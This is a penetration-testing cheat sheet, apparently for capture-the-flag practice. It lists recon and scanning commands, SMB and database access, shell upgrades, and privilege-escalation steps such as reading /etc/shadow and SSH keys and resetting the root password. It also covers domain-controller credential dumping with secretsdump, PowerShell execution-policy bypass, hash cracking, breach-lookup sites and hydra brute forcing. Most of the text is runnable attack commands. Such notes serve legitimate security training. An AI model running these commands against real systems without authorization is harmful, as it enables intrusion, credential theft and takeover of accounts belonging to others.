# step by step
https://hackyx.io/

## osint
https://dnsdumpster.com/
https://web.archive.org/
https://dorksearch.com/
https://www.shodan.io/
https://haveibeenpwned.com
https://data.mashedworld.com/dualmaps/map.htm

## recon
ping {ip}
whois {domain}
nslookup {ip}
dig {ip}
dnsrecon -d {domain} -a
host {domain}

https://dnsdumpster.com/
https://www.shodan.io/

## target scanning
sudo nmap --open #-p- for full port scan #-sV version detection #-sC default scripts #-Pn host discovery
(if hostname is found in nmap then add its hostname and ip to the /etc/hosts file)
(if sites, visit and if see versions, lookup cves)

### domain scanning
subfinder -d {domain}
dnsgen urls.lst | httprobe
httpx
whatweb
https://crt.sh/
https://certlogik.com/decoder/

## remote exploits
https://ctfsearch.hackmap.win/

### http/https
if seeing any url with a number change the number

### xss:
https://portswigger.net/web-security/cross-site-scripting/cheat-sheet

### upload
try other file extensions:
.php5

try adding paths:
../../pathname

try pdfs:
with iframes,script,imgs,xml...

### ftp
ftp anonymous@{IP}

### smb
smbmap -H {IP} #list shares on target with anomouse
smbmap -H {IP} -u {username} #guest/administrator
smbclient -L={IP} -U Administrator #try a login
smbclient //{IP}/{the\ share\ name} #connect to specifiec share
RECURSE ON
PROMPT OFF
cd {dir}
mget /Policies/*/MACHINE/Preferences/Groups/Groups.xml
mget *
smbget -R smb://{ip}/anonymous

### psql
psql -U {USER} -h {IP} -p 5432
\l #list databases
\c {name} #connect to a database
\dt #list tables
select * from {table} #show table content

### finding github source
when finding the source code,
compare the changes,
sometimes in this there might be found the difference

## getting connections
ssh -t {user}@{ip} /bin/sh
xfreerdp /v:{IP} /u:{USER} /p:{PASSWORD}
telnet {ip} {port}

### basic shell -> shell++
```
python3 -c 'import pty;pty.spawn("/bin/bash")'
```
```
script /dev/null -c bash
```
ctrl+Z and then
```
stty raw -echo && fg
```

## from a shell

### recon
whoami
id #default groups: audio video plugdev cdrom dip floppy netdev
groups
uname -a
printenv
cat /etc/sudoers
cat */.bash_history
cat */.bashrc
cat /etc/sudoers
cat /etc/sudoers.d
cat /etc/crontab
cat /var/spool/*
cat /etc/systemd/system
cat */.ssh/
cat /opt/
cat /etc/passwd
cat /etc/shadow

ss -tln #identify localports
ss -tla #identify name

find / -user root -perm /4000 2>/dev/null
find / -type f -perm -04000 -ls 2>/dev/null #find tools that have an suid, look these up on https://gtfobins.github.io/
chmod -s {found_binary} # to disallow others from abusing it

pspy32 #spy tool, open it on a host, login on second terminal, and maybe gain stuff
echo -e "hackerpassword\nhackerpassword" | passwd root

grep -r "THM{" / >> temp_flags.txt 2>/dev/null

nano /etc/passwd #shells -> /sbin/nologin

### sudo -L
https://gtfobins.github.io/

### other default binarys
https://lolbas-project.github.io/
https://www.loldrivers.io/


### ls *.ssh/ 
look for keys and try to login with them to other users
ssh {user}@{ip} -i {keyfile}

ssh2john {keyfile}>hash

#### pgp key decryption
gpg2john {file}.asc > hash
john --format=gpg --wordlist=/usr/share/wordlist/rockyou.txt hash
gpg --import {file}.asc
gpg --decrypt {file}.gpg

### windows
https://wadcoms.github.io/

#### impacket
secretsdump.py -just-dc -no-pass {dcname}\$@{dcip}

#### from a shell
cd C:\Program Files (x86)
dir

Get-ExecutionPolicy
Set-ExecutionPolicy -ExecutionPolicy Bypass

PrivescCheck.ps1

## cracking hashes
zip2john file.zip>{hashfile}
john {hashfile}
john {hashfile} --show

hashcat -a 0 -m 20 {hashfile} /usr/share/wordlists/rockyou.txt

### or looking them up
https://www.tunnelsup.com/hash-analyzer/
https://haveibeenpwned.com/
https://scatteredsecrets.com/
https://leakcheck.io/
https://leakpeek.com/
https://haveibeensold.app/
https://www.dehashed.com/
https://intelx.io/
https://default-password.info/
https://md5decrypt.net/en/

## brute forcing
hydra -L users.txt -P pass.txt {IP} ssh
hydra -l mike -P /usr/share/wordlists/rockyou.txt -vV {ip} ftp

gobuster dir --url {ip} --wordlist /usr/share/wordlists/dirb/big.txt
gobuster dns -d {domain} --wordlist /usr/share/wordlists/seclists/Discovery/DNS/bitquark-subdomains-top100000.txt

feroxbuster -u {ip}

ffuf -w /usr/share/wordlists/SecLists/Discovery/DNS/subdomains-top1million-110000.txt -u http://{domain}/ -H "HOST:FUZZ.{domain}" -fw 1 #vhost
ffuf -w /usr/share/wordlists/seclists/Discovery/DNS/bitquark-subdomains-top100000.txt -u http://{domain} -H 'Host: FUZZ.{domain}' -fw 4 -t 100
ffuf -w /usr/share/wordlists/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt:FFUZ -u http://{domain} -H 'Host: http://{domain}/FFUZ' -ic -t 100
ffuf -w /usr/share/wordlists/SecLists/Discovery/Web-Content/directory-list-2.3-medium.txt -u http://10.10.210.176:1337/hmr_FUZZ/ -mc 200,301 -c -v